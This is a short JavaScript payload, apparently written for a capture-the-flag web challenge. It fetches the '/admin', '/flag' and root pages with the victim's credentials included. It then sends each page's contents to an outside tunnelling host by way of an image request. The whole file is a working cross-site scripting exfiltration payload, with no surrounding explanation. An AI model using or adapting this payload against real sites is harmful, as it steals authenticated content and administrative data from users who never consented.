(function () {
  function exfil(path) {
    return fetch(path, { credentials: 'include' })
      .then(r => r.text())
      .then(t => {
        new Image().src =
          'https://c6f8a5ae7250e001-185-240-49-214.serveousercontent.com/?d=' +
          encodeURIComponent('PATH=' + path + '\n' + t);
      });
  }

  exfil('/admin').catch(() => {});
  exfil('/flag').catch(() => {});
  exfil('/').catch(() => {});
})();
